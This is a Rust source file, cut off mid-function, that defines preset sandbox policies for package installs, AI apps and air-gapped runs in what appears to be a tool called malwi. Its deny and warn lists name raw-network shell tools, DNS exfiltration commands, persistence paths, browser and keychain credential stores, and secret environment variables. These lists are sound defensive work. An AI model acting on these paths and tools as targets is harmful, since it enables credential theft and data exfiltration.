//! Policy templates — preset policies, shared pattern groups, and YAML serializer.
//!
//! Presets are defined as Rust functions that compose policies from shared
//! pattern groups (loaded from embedded YAML files). The `rules!` macro and
//! group macros make composition declarative and concise.

pub(crate) mod taxonomy;

use std::sync::{LazyLock, OnceLock};

use super::parser::{AllowDenySection, PolicyFile, Rule, SectionValue};

// ---------------------------------------------------------------------------
// parse_yaml_list — shared YAML list parser for group files
// ---------------------------------------------------------------------------

fn parse_yaml_list(raw: &str) -> Vec<String> {
    raw.lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .filter_map(|l| l.strip_prefix("- "))
        .map(|l| {
            let l = l.trim();
            if l.len() >= 2 && l.starts_with('"') && l.ends_with('"') {
                l[1..l.len() - 1].to_string()
            } else {
                l.to_string()
            }
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Group macros — lazily parsed YAML lists as shared pattern groups
// ---------------------------------------------------------------------------

static CREDENTIAL_FILES_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! credential_files {
    () => {
        CREDENTIAL_FILES_DATA
            .get_or_init(|| parse_yaml_list(include_str!("credential_files.yaml")))
            .as_slice()
    };
}

static KEYRINGS_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! keyrings {
    () => {
        KEYRINGS_DATA
            .get_or_init(|| parse_yaml_list(include_str!("keyrings.yaml")))
            .as_slice()
    };
}

static BROWSER_DATA_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! browser_data {
    () => {
        BROWSER_DATA_DATA
            .get_or_init(|| parse_yaml_list(include_str!("browser_data.yaml")))
            .as_slice()
    };
}

static PERSISTENCE_FILES_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! persistence_files {
    () => {
        PERSISTENCE_FILES_DATA
            .get_or_init(|| parse_yaml_list(include_str!("persistence_files.yaml")))
            .as_slice()
    };
}

static SHELL_PROFILES_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! shell_profiles {
    () => {
        SHELL_PROFILES_DATA
            .get_or_init(|| parse_yaml_list(include_str!("shell_profiles.yaml")))
            .as_slice()
    };
}

static SENSITIVE_ENVVARS_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! sensitive_envvars {
    () => {
        SENSITIVE_ENVVARS_DATA
            .get_or_init(|| parse_yaml_list(include_str!("sensitive_envvars.yaml")))
            .as_slice()
    };
}

static ANTI_TRACING_ENVVARS_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! anti_tracing_envvars {
    () => {
        ANTI_TRACING_ENVVARS_DATA
            .get_or_init(|| parse_yaml_list(include_str!("anti_tracing_envvars.yaml")))
            .as_slice()
    };
}

static DANGEROUS_SYMBOLS_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! dangerous_symbols {
    () => {
        DANGEROUS_SYMBOLS_DATA
            .get_or_init(|| parse_yaml_list(include_str!("dangerous_symbols.yaml")))
            .as_slice()
    };
}

static NETWORKING_SYMBOLS_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! networking_symbols {
    () => {
        NETWORKING_SYMBOLS_DATA
            .get_or_init(|| parse_yaml_list(include_str!("networking_symbols.yaml")))
            .as_slice()
    };
}

static NETWORK_FUNCTIONS_PYTHON_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! network_functions_python {
    () => {
        NETWORK_FUNCTIONS_PYTHON_DATA
            .get_or_init(|| parse_yaml_list(include_str!("network_functions_python.yaml")))
            .as_slice()
    };
}

static NETWORK_FUNCTIONS_NODEJS_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! network_functions_nodejs {
    () => {
        NETWORK_FUNCTIONS_NODEJS_DATA
            .get_or_init(|| parse_yaml_list(include_str!("network_functions_nodejs.yaml")))
            .as_slice()
    };
}

static FILE_FUNCTIONS_PYTHON_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! file_functions_python {
    () => {
        FILE_FUNCTIONS_PYTHON_DATA
            .get_or_init(|| parse_yaml_list(include_str!("file_functions_python.yaml")))
            .as_slice()
    };
}

static FILE_FUNCTIONS_NATIVE_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! file_functions_native {
    () => {
        FILE_FUNCTIONS_NATIVE_DATA
            .get_or_init(|| parse_yaml_list(include_str!("file_functions_native.yaml")))
            .as_slice()
    };
}

/// Networking symbols accessor for sibling modules (e.g. active.rs).
pub(crate) fn networking_symbols() -> &'static [String] {
    networking_symbols!()
}

/// Network functions (Python) accessor for sibling modules.
pub(crate) fn network_functions_python() -> &'static [String] {
    network_functions_python!()
}

/// Network functions (Node.js) accessor for sibling modules.
pub(crate) fn network_functions_nodejs() -> &'static [String] {
    network_functions_nodejs!()
}

/// File functions (Python) accessor for sibling modules.
pub(crate) fn file_functions_python() -> &'static [String] {
    file_functions_python!()
}

/// File functions (Native) accessor for sibling modules.
pub(crate) fn file_functions_native() -> &'static [String] {
    file_functions_native!()
}

static SCRIPTING_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! scripting {
    () => {
        SCRIPTING_DATA
            .get_or_init(|| parse_yaml_list(include_str!("scripting.yaml")))
            .as_slice()
    };
}

static EXFILTRATION_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! exfiltration {
    () => {
        EXFILTRATION_DATA
            .get_or_init(|| parse_yaml_list(include_str!("exfiltration.yaml")))
            .as_slice()
    };
}

static CREDENTIAL_READERS_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! credential_readers {
    () => {
        CREDENTIAL_READERS_DATA
            .get_or_init(|| parse_yaml_list(include_str!("credential_readers.yaml")))
            .as_slice()
    };
}

static ANTI_TRACING_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! anti_tracing {
    () => {
        ANTI_TRACING_DATA
            .get_or_init(|| parse_yaml_list(include_str!("anti_tracing.yaml")))
            .as_slice()
    };
}

static INTERPROCESS_COMMUNICATION_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! interprocess_communication {
    () => {
        INTERPROCESS_COMMUNICATION_DATA
            .get_or_init(|| parse_yaml_list(include_str!("interprocess_communication.yaml")))
            .as_slice()
    };
}

static RECONNAISSANCE_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! reconnaissance {
    () => {
        RECONNAISSANCE_DATA
            .get_or_init(|| parse_yaml_list(include_str!("reconnaissance.yaml")))
            .as_slice()
    };
}

static CONTAINER_ESCAPE_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! container_escape {
    () => {
        CONTAINER_ESCAPE_DATA
            .get_or_init(|| parse_yaml_list(include_str!("container_escape.yaml")))
            .as_slice()
    };
}

static MANDATORY_ACCESS_CONTROL_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! mandatory_access_control {
    () => {
        MANDATORY_ACCESS_CONTROL_DATA
            .get_or_init(|| parse_yaml_list(include_str!("mandatory_access_control.yaml")))
            .as_slice()
    };
}

static FILESYSTEM_HARDENING_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! filesystem_hardening {
    () => {
        FILESYSTEM_HARDENING_DATA
            .get_or_init(|| parse_yaml_list(include_str!("filesystem_hardening.yaml")))
            .as_slice()
    };
}

static KERNEL_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! kernel {
    () => {
        KERNEL_DATA
            .get_or_init(|| parse_yaml_list(include_str!("kernel.yaml")))
            .as_slice()
    };
}

static DEBUG_INJECTION_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! debug_injection {
    () => {
        DEBUG_INJECTION_DATA
            .get_or_init(|| parse_yaml_list(include_str!("debug_injection.yaml")))
            .as_slice()
    };
}

static PRIVILEGE_ESCALATION_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! privilege_escalation {
    () => {
        PRIVILEGE_ESCALATION_DATA
            .get_or_init(|| parse_yaml_list(include_str!("privilege_escalation.yaml")))
            .as_slice()
    };
}

/// Composite: all baseline warn categories combined.
static WARN_BASELINE_DATA: OnceLock<Vec<String>> = OnceLock::new();
macro_rules! warn_baseline {
    () => {
        WARN_BASELINE_DATA
            .get_or_init(|| {
                let mut v = Vec::new();
                v.extend_from_slice(scripting!());
                v.extend_from_slice(exfiltration!());
                v.extend_from_slice(credential_readers!());
                v.extend_from_slice(anti_tracing!());
                v.extend_from_slice(interprocess_communication!());
                v.extend_from_slice(reconnaissance!());
                v.extend_from_slice(container_escape!());
                v.extend_from_slice(mandatory_access_control!());
                v.extend_from_slice(filesystem_hardening!());
                v.extend_from_slice(kernel!());
                v.extend_from_slice(debug_injection!());
                v.extend_from_slice(privilege_escalation!());
                v
            })
            .as_slice()
    };
}

// ---------------------------------------------------------------------------
// rules! macro — builds Vec<Rule> from group macros and inline literals
// ---------------------------------------------------------------------------

macro_rules! rules {
    () => { Vec::new() };
    (@push $v:ident;) => {};
    // Group macro invocation: name!()
    (@push $v:ident; $name:ident ! () , $($rest:tt)*) => {
        $v.extend($name!().iter().map(|p| Rule::Simple(p.clone())));
        rules!(@push $v; $($rest)*);
    };
    (@push $v:ident; $name:ident ! ()) => {
        $v.extend($name!().iter().map(|p| Rule::Simple(p.clone())));
    };
    // String literal
    (@push $v:ident; $pattern:expr , $($rest:tt)*) => {
        $v.push(Rule::Simple($pattern.to_string()));
        rules!(@push $v; $($rest)*);
    };
    (@push $v:ident; $pattern:expr) => {
        $v.push(Rule::Simple($pattern.to_string()));
    };
    ($($input:tt)*) => {{
        let mut v: Vec<Rule> = Vec::new();
        rules!(@push v; $($input)*);
        v
    }};
}

// ---------------------------------------------------------------------------
// Helper to build a PolicyFile from sections
// ---------------------------------------------------------------------------

fn policy(sections: Vec<(&str, SectionValue)>) -> PolicyFile {
    PolicyFile {
        version: 1,
        sections: sections
            .into_iter()
            .map(|(k, v)| (k.to_string(), v))
            .collect(),
        includes: Vec::new(),
    }
}

fn ad(section: AllowDenySection) -> SectionValue {
    SectionValue::AllowDeny(section)
}

// ---------------------------------------------------------------------------
// Preset functions
// ---------------------------------------------------------------------------

/// Default observe-mode policy: warn/log, no blocking.
pub fn default_policy() -> PolicyFile {
    policy(vec![
        (
            "symbols",
            ad(AllowDenySection {
                warn: rules!["getpass", "crypt"],
                ..Default::default()
            }),
        ),
        (
            "python",
            ad(AllowDenySection {
                warn: rules![
                    "getpass.getpass",
                    "keyring.get_password",
                    "keyring.set_password",
                    "ctypes.CDLL",
                    "ctypes.cdll.LoadLibrary"
                ],
                log: rules![
                    "socket.create_connection",
                    "socket.socket.connect",
                    "urllib.request.urlopen",
                    "requests.Session.request",
                    "http.client.HTTPConnection.request",
                    "http.client.HTTPSConnection.request",
                    "ssl.wrap_socket",
                    "ssl.SSLContext.wrap_socket"
                ],
                ..Default::default()
            }),
        ),
        (
            "nodejs",
            ad(AllowDenySection {
                log: rules![
                    "dns.lookup",
                    "dns.resolve",
                    "net.connect",
                    "tls.connect",
                    "fetch",
                    "http.request",
                    "https.request",
                    "http.get",
                    "https.get"
                ],
                ..Default::default()
            }),
        ),
        (
            "commands",
            ad(AllowDenySection {
                warn: rules![
                    // Privilege escalation
                    "sudo",
                    "su",
                    "doas",
                    // Remote access
                    "ssh",
                    "scp",
                    "sftp",
                    // Raw networking
                    "nc",
                    "ncat",
                    "socat",
                    "telnet",
                    // Encoding tools
                    "base64",
                    "xxd",
                    // Persistence mechanisms
                    "crontab",
                    "launchctl",
                    "systemctl",
                    warn_baseline!()
                ],
                log: rules!["curl", "wget", "git", "npm", "pip", "gem", "cargo", "docker", "nmap"],
                ..Default::default()
            }),
        ),
        (
            "network",
            ad(AllowDenySection {
                warn: rules![
                    "169.254.169.254/**",
                    "metadata.google.internal/**",
                    "*.onion",
                    "*.i2p",
                    "*.bit",
                    "*.loki"
                ],
                log: rules!["*", "*/**", "*:*"],
                ..Default::default()
            }),
        ),
        (
            "files",
            ad(AllowDenySection {
                warn: rules![
                    credential_files!(),
                    "~/.local/share/keyrings/**",
                    "~/.local/share/kwalletd/**",
                    "~/.config/autostart/**",
                    "~/.config/systemd/user/**",
                    "/etc/ld.so.preload",
                    "/proc/*/environ"
                ],
                ..Default::default()
            }),
        ),
        (
            "envvars",
            ad(AllowDenySection {
                warn: rules![sensitive_envvars!(), anti_tracing_envvars!()],
                ..Default::default()
            }),
        ),
    ])
}

/// npm install policy: restrict to npmjs.org, block credential access.
pub fn npm_install() -> PolicyFile {
    policy(vec![
        (
            "nodejs",
            ad(AllowDenySection {
                allow: rules![
                    "dns.lookup",
                    "dns.resolve",
                    "net.connect",
                    "tls.connect",
                    "fetch",
                    "http.request",
                    "https.request",
                    "http.get",
                    "https.get"
                ],
                deny: rules!["eval", "vm.runInContext", "vm.runInNewContext"],
                ..Default::default()
            }),
        ),
        (
            "commands",
            ad(AllowDenySection {
                allow: rules!["node", "sh", "bash", "git"],
                deny: rules![
                    "curl", "wget", "ssh", "nc", "ncat", "*sudo*", "python*", "perl", "ruby"
                ],
                warn: rules![warn_baseline!()],
                ..Default::default()
            }),
        ),
        (
            "network",
            ad(AllowDenySection {
                allow: rules!["registry.npmjs.org/**", "*.npmjs.org/**"],
                ..Default::default()
            }),
        ),
        (
            "symbols",
            ad(AllowDenySection {
                warn: rules![dangerous_symbols!()],
                ..Default::default()
            }),
        ),
        (
            "files",
            ad(AllowDenySection {
                deny: rules![
                    credential_files!(),
                    keyrings!(),
                    persistence_files!(),
                    browser_data!(),
                    shell_profiles!()
                ],
                ..Default::default()
            }),
        ),
        (
            "envvars",
            ad(AllowDenySection {
                deny: rules![sensitive_envvars!(), anti_tracing_envvars!()],
                ..Default::default()
            }),
        ),
    ])
}

/// PyPI install policy: restrict to pypi.org, block credential access.
/// Applies to pip, pip3, and uv package installers.
pub fn pypi_install() -> PolicyFile {
    policy(vec![
        (
            "python",
            ad(AllowDenySection {
                deny: rules![
                    "ctypes.CDLL",
                    "ctypes.cdll.LoadLibrary",
                    "ctypes.WinDLL",
                    "getpass.getpass",
                    "keyring.get_password",
                    "keyring.set_password",
                    "webbrowser.open"
                ],
                warn: rules![
                    "os.system",
                    "os.popen",
                    "subprocess.call",
                    "subprocess.Popen",
                    "subprocess.run",
                    "subprocess.check_call",
                    "subprocess.check_output"
                ],
                ..Default::default()
            }),
        ),
        (
            "commands",
            ad(AllowDenySection {
                allow: rules![
                    "rustc", "uname", "git", "uv",
                    // python* needed for uv interpreter probing and pip build
                    // isolation. Safe: child processes get agent injected via
                    // DYLD/LD_PRELOAD with the same policy protections.
                    "python*"
                ],
                deny: rules![
                    "curl", "wget", "ssh", "nc", "ncat", "*sudo*", "sh", "bash", "perl", "ruby"
                ],
                warn: rules![warn_baseline!()],
                ..Default::default()
            }),
        ),
        (
            "network",
            ad(AllowDenySection {
                allow: rules![
                    "pypi.org/**",
                    "*.pypi.org/**",
                    "files.pythonhosted.org/**",
                    "*.pythonhosted.org/**"
                ],
                ..Default::default()
            }),
        ),
        (
            "symbols",
            ad(AllowDenySection {
                warn: rules![dangerous_symbols!()],
                ..Default::default()
            }),
        ),
        (
            "files",
            ad(AllowDenySection {
                deny: rules![
                    credential_files!(),
                    keyrings!(),
                    persistence_files!(),
                    browser_data!(),
                    shell_profiles!()
                ],
                ..Default::default()
            }),
        ),
        (
            "envvars",
            ad(AllowDenySection {
                deny: rules![sensitive_envvars!(), anti_tracing_envvars!()],
                ..Default::default()
            }),
        ),
    ])
}

/// ComfyUI policy: AI image generation, Python threat model.
pub fn comfyui() -> PolicyFile {
    policy(vec![
        (
            "python",
            ad(AllowDenySection {
                deny: rules![
                    "getpass.getpass",
                    "keyring.get_password",
                    "keyring.set_password",
                    "ctypes.CDLL",
                    "ctypes.cdll.LoadLibrary",
                    "ctypes.WinDLL"
                ],
                warn: rules!["os.system", "os.popen"],
                ..Default::default()
            }),
        ),
        (
            "commands",
            ad(AllowDenySection {
                allow: rules![
                    "git clone *",
                    "git pull *",
                    "git fetch *",
                    "git checkout *",
                    "git submodule *",
                    "git status",
                    "git status *",
                    "git version",
                    "git rev-parse *",
                    "git log *",
                    "git diff *",
                    "git describe *",
                    "git branch",
                    "git branch *",
                    "git show *",
                    "git config *",
                    "git ls-remote *",
                    "git remote -v",
                    "pip install *",
                    "pip3 install *",
                    "pip freeze",
                    "pip list",
                    "pip show *",
                    "python -m pip *",
                    "python3 -m pip *",
                    "uv pip *",
                    "uv sync *",
                    "uv run *",
                    "python3 -I *",
                    "python -I *",
                    "python3 -c *",
                    "python -c *",
                    "python3 --version",
                    "python --version",
                    "nvidia-smi",
                    "nvidia-smi *"
                ],
                ..Default::default()
            }),
        ),
        (
            "symbols",
            ad(AllowDenySection {
                warn: rules!["getpass", "crypt", "keyring", "symlink", "link", "syscall"],
                ..Default::default()
            }),
        ),
        (
            "network",
            ad(AllowDenySection {
                allow: rules![
                    "huggingface.co/**",
                    "*.huggingface.co/**",
                    "civitai.com/**",
                    "*.civitai.com/**",
                    "github.com/**",
                    "*.githubusercontent.com/**",
                    "codeload.github.com/**",
                    "pypi.org/**",
                    "*.pypi.org/**",
                    "files.pythonhosted.org/**",
                    "*.pythonhosted.org/**",
                    "127.0.0.1:*/**",
                    "localhost:*/**",
                    "0.0.0.0:*/**"
                ],
                protocols: vec!["https".into(), "http".into(), "wss".into(), "ws".into()],
                ..Default::default()
            }),
        ),
        (
            "files",
            ad(AllowDenySection {
                deny: rules![
                    credential_files!(),
                    keyrings!(),
                    persistence_files!(),
                    browser_data!(),
                    shell_profiles!()
                ],
                ..Default::default()
            }),
        ),
        (
            "envvars",
            ad(AllowDenySection {
                allow: rules!["HF_HUB_*", "HF_TOKEN_PATH", "OAUTH_CLIENT_SECRET"],
                warn: rules![
                    "*_SECRET*",
                    "*_TOKEN",
                    "*_TOKEN_*",
                    "*_PASSWORD",
                    "*_PASSWORD_*",
                    "*_API_KEY",
                    "*_API_KEY_*",
                    "*_PRIVATE_KEY*"
                ],
                deny: rules![
                    // Cloud provider credentials
                    "AWS_SECRET_ACCESS_KEY",
                    "AWS_ACCESS_KEY_ID",
                    "AWS_SESSION_TOKEN",
                    "AWS_SECURITY_TOKEN",
                    "GCP_SERVICE_ACCOUNT_KEY",
                    "GOOGLE_APPLICATION_CREDENTIALS",
                    "GOOGLE_API_KEY",
                    "AZURE_CLIENT_SECRET",
                    "AZURE_CLIENT_ID",
                    // AI/ML provider keys
                    "OPENAI_API_KEY",
                    "ANTHROPIC_API_KEY",
                    "HF_TOKEN",
                    "STABILITY_API_KEY",
                    "REPLICATE_API_TOKEN",
                    "CIVITAI_API_TOKEN",
                    // Code hosting / package registries
                    "GITHUB_TOKEN",
                    "NPM_TOKEN",
                    // Messaging integrations
                    "DISCORD_TOKEN",
                    "DISCORD_WEBHOOK_URL",
                    "TELEGRAM_BOT_TOKEN",
                    // Other credentials
                    "DATABASE_URL",
                    "SSH_PRIVATE_KEY",
                    "STRIPE_SECRET_KEY",
                    // Injection vectors
                    anti_tracing_envvars!()
                ],
                ..Default::default()
            }),
        ),
    ])
}

/// Openclaw policy: multi-channel AI gateway.
pub fn openclaw() -> PolicyFile {
    policy(vec![
        (
            "nodejs",
            ad(AllowDenySection {
                allow: rules![
                    "dns.lookup",
                    "dns.resolve",
                    "net.connect",
                    "net.createServer",
                    "tls.connect",
                    "fetch",
                    "http.request",
                    "https.request",
                    "http.get",
                    "https.get",
                    "http.createServer",
                    "https.createServer"
                ],
                deny: rules![
                    "eval",
                    "vm.runInContext",
                    "vm.runInNewContext",
                    "vm.compileFunction",
                    "child_process.exec",
                    "child_process.execSync"
                ],
                ..Default::default()
            }),
        ),
        (
            "commands",
            ad(AllowDenySection {
                allow: rules![
                    "node",
                    "git",
                    "npm",
                    "npx",
                    "pnpm",
                    "corepack",
                    "launchctl",
                    "systemctl",
                    "schtasks",
                    "docker",
                    "ssh",
                    "openssl",
                    "ffmpeg",
                    "ffprobe",
                    "security",
                    "sw_vers",
                    "sysctl",
                    "scutil",
                    "defaults",
                    "lsof",
                    "brew",
                    "gcloud",
                    "taskkill"
                ],
                deny: rules![
                    "curl", "wget", "nc", "ncat", "netcat", "socat", "telnet", "scp", "python*",
                    "perl", "ruby", "base64", "xxd", "pbcopy", "xclip", "crontab"
                ],
                warn: {
                    let mut w = rules![
                        "sh",
                        "bash",
                        scripting!(),
                        exfiltration!(),
                        anti_tracing!(),
                        interprocess_communication!(),
                        reconnaissance!(),
                        container_escape!(),
                        mandatory_access_control!(),
                        filesystem_hardening!(),
                        kernel!(),
                        debug_injection!(),
                        privilege_escalation!()
                    ];
                    // Credential readers minus "defaults" (allowed for openclaw)
                    for p in credential_readers!() {
                        if p != "defaults" {
                            w.push(Rule::Simple(p.clone()));
                        }
                    }
                    w
                },
                review: rules!["sudo", "su", "doas"],
                ..Default::default()
            }),
        ),
        (
            "network",
            ad(AllowDenySection {
                allow: rules![
                    "openclaw.ai/**",
                    "*.openclaw.ai/**",
                    "registry.npmjs.org/**",
                    "*.npmjs.org/**",
                    "github.com/**",
                    "*.githubusercontent.com/**",
                    "api.anthropic.com/**",
                    "api.openai.com/**",
                    "slack.com/**",
                    "*.slack.com/**",
                    "api.telegram.org/**",
                    "discord.com/**",
                    "*.discord.com/**",
                    "gateway.discord.gg/**",
                    "graph.facebook.com/**",
                    "127.0.0.1:*/**",
                    "localhost:*/**"
                ],
                protocols: vec!["https".into(), "http".into(), "wss".into(), "ws".into()],
                ..Default::default()
            }),
        ),
        (
            "symbols",
            ad(AllowDenySection {
                warn: rules![dangerous_symbols!()],
                ..Default::default()
            }),
        ),
        (
            "files",
            ad(AllowDenySection {
                deny: rules![
                    credential_files!(),
                    keyrings!(),
                    persistence_files!(),
                    browser_data!(),
                    shell_profiles!()
                ],
                ..Default::default()
            }),
        ),
        (
            "envvars",
            ad(AllowDenySection {
                deny: rules![
                    "*SECRET*",
                    "*PASSWORD*",
                    "*PRIVATE_KEY*",
                    "AWS_*",
                    "GITHUB_*",
                    "GCP_*",
                    "AZURE_*",
                    anti_tracing_envvars!()
                ],
                warn: rules![
                    "*TOKEN*",
                    "*API_KEY*",
                    "OPENAI_*",
                    "ANTHROPIC_*",
                    "CLAUDE_*",
                    "OPENCLAW_*",
                    "HF_TOKEN"
                ],
                ..Default::default()
            }),
        ),
    ])
}

/// Bash install script policy: curl/wget allowed, interpreters blocked.
pub fn bash_install() -> PolicyFile {
    policy(vec![
        (
            "commands",
            ad(AllowDenySection {
                allow: rules![
                    // Download tools
                    "curl",
                    "wget",
                    // Package managers
                    "apt",
                    "apt-get",
                    "yum",
                    "dnf",
                    "brew",
                    "pacman",
                    "apk",
                    "zypper",
                    "dpkg",
                    "rpm",
                    "snap",
                    "flatpak",
                    "pip",
                    "pip3",
                    "npm",
                    "gem",
                    // Build tools
                    "make",
                    "cmake",
                    "gcc",
                    "g++",
                    "cc",
                    "cargo",
                    "rustup",
                    "go",
                    // File and text utilities
                    "tar",
                    "unzip",
                    "gzip",
                    "gunzip",
                    "bzip2",
                    "xz",
                    "cp",
                    "mv",
                    "rm",
                    "mkdir",
                    "install",
                    "cat",
                    "tee",
                    "sed",
                    "awk",
                    "grep",
                    "cut",
                    "sort",
                    "head",
                    "tail",
                    "wc",
                    "tr",
                    "find",
                    "dirname",
                    "basename",
                    "mktemp",
                    "realpath",
                    "readlink",
                    // Checksum and verification
                    "sha256sum",
                    "sha1sum",
                    "md5sum",
                    "shasum",
                    "gpg",
                    "gpgv",
                    // System info
                    "uname",
                    "arch",
                    "id",
                    "whoami",
                    "hostname",
                    "getconf",
                    "sw_vers",
                    "lsb_release",
                    "dpkg-architecture",
                    // Process control
                    "true",
                    "false",
                    "test",
                    "[",
                    "sleep",
                    "env",
                    "printenv",
                    "which",
                    "command",
                    "type",
                    // Version managers
                    "git",
                    "nvm",
                    "rbenv",
                    "pyenv",
                    "asdf",
                    "volta",
                    "python -m venv *",
                    "python3 -m venv *",
                    // Shell utilities
                    "chmod",
                    "chown",
                    "chgrp",
                    "touch",
                    "date",
                    "echo",
                    "printf",
                    "tput",
                    "stty"
                ],
                deny: rules![
                    // Interpreters
                    "python*",
                    "perl",
                    "ruby",
                    "node",
                    // Raw networking
                    "nc",
                    "ncat",
                    "netcat",
                    "socat",
                    "telnet",
                    // DNS exfiltration
                    "dig",
                    "nslookup",
                    "host",
                    // Persistence
                    "crontab",
                    "at",
                    "launchctl",
                    "systemctl",
                    // Clipboard
                    "pbcopy",
                    "pbpaste",
                    "xclip",
                    "xsel",
                    // Remote access
                    "ssh",
                    "scp",
                    "sftp",
                    // macOS keychain
                    "security",
                    // File access bypass
                    "dd",
                    // Data exfiltration / staging
                    "ditto",
                    "zip",
                    "rsync",
                    // Encrypted channels
                    "openssl"
                ],
                warn: rules!["eval", "ln", "base64", "xxd", "rev", warn_baseline!()],
                review: rules!["sudo", "su", "doas"],
                ..Default::default()
            }),
        ),
        (
            "files",
            ad(AllowDenySection {
                deny: rules![
                    credential_files!(),
                    "~/.local/share/keyrings/**",
                    "~/.local/share/kwalletd/**",
                    // Shell profiles (extended set for bash-install)
                    "~/.bashrc",
                    "~/.bash_profile",
                    "~/.zshrc",
                    "~/.zprofile",
                    "~/.profile",
                    "~/.login",
                    // macOS persistence
                    "~/Library/LaunchAgents/**",
                    "~/Library/LaunchDaemons/*",
                    "/Library/LaunchDaemons/**",
                    "/Library/LaunchAgents/**",
                    // macOS credential/browser stores
                    "~/Library/Keychains/**",
                    "~/Library/Cookies/**",
                    "~/Library/Application Support/Google/Chrome/*/Login Data*",
                    "~/Library/Application Support/Firefox/Profiles/**/*.sqlite",
                    // Linux autostart/systemd
                    "~/.config/autostart/**",
                    "~/.config/systemd/user/**",
                    // Linux persistence (extended)
                    "/etc/cron*",
                    "/etc/systemd/**",
                    "/etc/udev/rules.d/**",
                    "/etc/init.d/**",
                    "/var/spool/cron/**",
                    "~/.crontab",
                    // System-level preload
                    "/etc/ld.so.preload",
                    "/etc/ld.so.conf",
                    "/etc/ld.so.conf.d/**",
                    // Git hooks
                    ".git/hooks/*",
                    "*/.git/hooks/*",
                    // System files
                    "/etc/passwd",
                    "/etc/shadow",
                    // Browser data
                    "*/Google/Chrome/**",
                    "*/Firefox/**",
                    "*/Safari/**",
                    "~/.mozilla/firefox/**/*.sqlite",
                    "~/.config/google-chrome/*/Login Data*",
                    // Shared memory
                    "/dev/shm/*",
                    // Process information
                    "/proc/*/environ",
                    "/proc/*/maps",
                    "/proc/*/mem"
                ],
                ..Default::default()
            }),
        ),
        (
            "network",
            ad(AllowDenySection {
                protocols: vec!["https".into(), "http".into()],
                ..Default::default()
            }),
        ),
        (
            "symbols",
            ad(AllowDenySection {
                warn: rules![dangerous_symbols!()],
                ..Default::default()
            }),
        ),
        (
            "envvars",
            ad(AllowDenySection {
                deny: rules![sensitive_envvars!(), anti_tracing_envvars!()],
                ..Default::default()
            }),
        ),
    ])
}

/// Air-gap policy: total network isolation.
pub fn air_gap() -> PolicyFile {
    policy(vec![
        (
            "network",
            ad(AllowDenySection {
                deny: rules!["*", "*/**", "*:*"],
                ..Default::default()
            }),
        ),
        (
            "commands",
            ad(AllowDenySection {
                deny: rules![
                    // HTTP/download
                    "curl",
                    "wget",
                    "aria2c",
                    // Remote access
                    "ssh",
                    "scp",
                    "sftp",
                    "ftp",
                    "rsync",
                    // Raw networking
                    "nc",
                    "ncat",
                    "netcat",
                    "socat",
                    "telnet",
                    "openssl",
                    // Network recon
                    "nmap",
                    "ping",
                    "ping6",
                    "traceroute",
                    "tracepath",
                    // DNS
                    "dig",
                    "nslookup",
                    "host",
                    // Privilege escalation
                    "sudo",
                    "su",
                    "doas",
                    // Network configuration
                    "ip",
                    "ifconfig",
                    "iptables",
                    "nft",
                    "route",
                    // Data staging
                    "ditto",
                    "zip"
                ],
                warn: rules![warn_baseline!()],
                ..Default::default()
            }),
        ),
        (
            "symbols",
            ad(AllowDenySection {
                deny: rules![networking_symbols!(), "syscall", "getpass", "crypt"],
                ..Default::default()
            }),
        ),
        (
            "files",
            ad(AllowDenySection {
                deny: rules![
                    credential_files!(),
                    keyrings!(),
                    persistence_files!(),
                    browser_data!(),
                    shell_profiles!()
                ],
                ..Default::default()
            }),
        ),
        (
            "envvars",
            ad(AllowDenySection {
                deny: rules![sensitive_envvars!(), anti_tracing_envvars!()],
                ..Default::default()
            }),
        ),
    ])
}

// ---------------------------------------------------------------------------
// YAML serializer — converts PolicyFile to YAML for user-facing config files
// ---------------------------------------------------------------------------

/// Serialize a `PolicyFile` to valid YAML.
pub fn policy_to_yaml(policy: &PolicyFile, name: &str) -> String {
    let mut out = String::with_capacity(2048);

    // Header
    out.push_str(&format!("# {} policy — generated by malwi\n", name));
    out.push_str(&format!("version: {}\n", policy.version));

    // Stable section ordering for deterministic output
    let section_order = [
        "symbols", "python", "nodejs", "commands", "network", "files", "envvars",
    ];

    for &name in &section_order {
        if let Some(section) = policy.sections.get(name) {
            out.push('\n');
            write_section(&mut out, name, section);
        }
    }

    // Any sections not in the standard order
    let mut extra: Vec<_> = policy
        .sections
        .keys()
        .filter(|k| !section_order.contains(&k.as_str()))
        .collect();
    extra.sort();
    for name in extra {
        out.push('\n');
        write_section(&mut out, name, &policy.sections[name]);
    }

    out
}

fn write_section(out: &mut String, name: &str, section: &SectionValue) {
    match section {
        SectionValue::AllowDeny(ad) => {
            out.push_str(&format!("{}:\n", name));
            write_rules_list(out, "allow", &ad.allow);
            write_rules_list(out, "deny", &ad.deny);
            write_rules_list(out, "warn", &ad.warn);
            write_rules_list(out, "log", &ad.log);
            write_rules_list(out, "review", &ad.review);
            write_rules_list(out, "noop", &ad.noop);
            if !ad.protocols.is_empty() {
                out.push_str(&format!("  protocols: [{}]\n", ad.protocols.join(", ")));
            }
        }
